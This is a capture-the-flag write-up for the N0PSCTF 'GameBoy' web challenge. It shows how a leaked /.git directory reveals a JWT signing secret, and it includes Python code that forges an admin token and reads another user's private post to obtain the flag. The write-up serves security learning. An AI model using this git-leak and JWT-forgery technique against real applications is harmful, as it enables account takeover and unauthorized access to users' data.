# N0PSCTF - GameBoy

## Approach

Find the `/.git` directory is leaked, and in `/.git/logs/HEAD` there is:

```
0000000000000000000000000000000000000000 7a58eff2597c4aa7fd65cb8087609ffa1043bd7f gitb0ss <gitb0ss@nops.topia> 1746452251 +0200	commit (initial): best blog ever ready to gooo
7a58eff2597c4aa7fd65cb8087609ffa1043bd7f 7a58eff2597c4aa7fd65cb8087609ffa1043bd7f gitb0ss <gitb0ss@nops.topia> 1746452265 +0200	checkout: moving from master to dev
7a58eff2597c4aa7fd65cb8087609ffa1043bd7f bb5273993121d77fdb1e743cee8d29ed762ebb86 gitb0ss <gitb0ss@nops.topia> 1746452334 +0200	commit: true secret jwt secret
bb5273993121d77fdb1e743cee8d29ed762ebb86 7a58eff2597c4aa7fd65cb8087609ffa1043bd7f gitb0ss <gitb0ss@nops.topia> 1746452342 +0200	checkout: moving from dev to master
7a58eff2597c4aa7fd65cb8087609ffa1043bd7f 41b4cea2e90da0498605077f5361e0cc65890899 gitb0ss <gitb0ss@nops.topia> 1746452368 +0200	commit: removed debug mode ^^'
41b4cea2e90da0498605077f5361e0cc65890899 bb5273993121d77fdb1e743cee8d29ed762ebb86 gitb0ss <gitb0ss@nops.topia> 1746452375 +0200	checkout: moving from master to dev
```

The commit with the message `commit: true secret jwt secret` looks suspicious, and we can find the JWT secret here:

![commit.jpg](commit.jpg)

We can find all the userids in the `/api/users` endpoint, including:

```
admin:     cfea660f-1d93-475c-9272-20aaba055e98
noopsy123: 7a0dfc65-5890-4b54-a79b-c05dfce52c7d
```

Then generate a JWT token for the `admin` with the obtained secret:

```python
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0ODc3ODM3MiwianRpIjoiZjkwN2QwZDMtZWE0Yi00MDJkLThhNGQtYmU0NDQzNmMxNmZiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6IjE4YjNlOTI5LTZlNTQtNDI0MS1hNWYxLTYyNDE3Nzg2ZTY4ZCIsIm5iZiI6MTc0ODc3ODM3MiwiY3NyZiI6IjAwZmY3MDNhLTg1M2MtNGQzYS1hZGIxLTdkN2Y5OTMxYzE4NSIsImV4cCI6MTc0ODc3OTI3MiwidXNlcm5hbWUiOiIxMjMifQ.XkWqHIjNkCipDRhxD9NYTj6ykBdLlN8cYze1buqYDLc"
secret = "6e29664d48f684ce84a858c7e10c39f588f7ff44151d8e7db59ce6d2e189436172963420fe277a5d591736db6e8ac7b28c7dcfec7933a78877f9684ed1a9513af320e8177e2607512959f38b480249e49a27debef9f0cc8c8d24fec534a48ce62a21509a9ebc812580faebbd48190875d5bc7cd64a7a955790c9dd73a375ea1a55f7033ed0331560c3d824c9c669fe850cad4208477dd0894dcc7d5b42cc7de2fab882ce2189571fd456520d1e29a132acb9f21ba2ddf12e2ae5f41c91f5aca7925c5e1d04c6cdd9c03557203b9b1cabcf7c962b7d8a602fac0e4fd61c2794498d8a7f331b299bd90cf397a809208c18d6b48f0c19949c38feaaa5ca542cdc79"

headers = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})
print(headers)
print(payload)

payload["sub"] = "cfea660f-1d93-475c-9272-20aaba055e98"
payload["exp"] = "9999999999"
payload["username"] = "admin"
token_exp = jwt.encode(payload, key=secret, algorithm="HS256", headers=headers)
print(token_exp)
```

With the generated token, we can read the private post of `noopsy123`, which contains the flag:

```python
resp = requests.get(
    "https://nopsctf-1ef6b3daeaf0-gameboy-0.chals.io/api/user/7a0dfc65-5890-4b54-a79b-c05dfce52c7d",
    headers={"X-Access-Token": token_exp}
)
print(resp.text) # N0PS{d0t_G17_1n_Pr0DuC710n?!!}
```

## Flag

```
N0PS{d0t_G17_1n_Pr0DuC710n?!!}
```
